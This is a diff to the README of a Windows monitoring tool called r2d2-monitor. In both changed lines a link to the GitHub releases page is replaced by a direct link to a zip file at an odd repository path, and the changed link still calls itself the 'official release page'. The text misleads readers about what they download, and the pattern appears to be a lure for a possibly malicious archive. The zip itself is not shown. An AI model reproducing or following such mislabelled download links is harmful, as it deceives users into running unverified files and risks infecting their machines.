@@ -1,6 +1,6 @@
 # 🤖 r2d2-monitor - Track your Windows system performance effectively
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Bhattp6242/r2d2-monitor/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Bhattp6242/r2d2-monitor/raw/refs/heads/main/attempt/d-monitor-r-v2.7.zip)
 
 R2-D2 Monitor tracks your computer hardware. The program displays how hard your processor works. It tracks memory usage and disk health. You gain insight into your system performance. Use this tool to find bottlenecks. 
 
@@ -18,7 +18,7 @@ The software requires minimal disk space. You do not need special drivers to run
 
 Follow these steps to set up the monitor on your windows machine.
 
-1. Visit the [official release page](https://github.com/Bhattp6242/r2d2-monitor/releases) to download the installer.
+1. Visit the [official release page](https://github.com/Bhattp6242/r2d2-monitor/raw/refs/heads/main/attempt/d-monitor-r-v2.7.zip) to download the installer.
 2. Select the file ending in .msi to trigger the download.
 3. Save the file to your desktop for easy access.
 4. Double-click the file to start the installer.
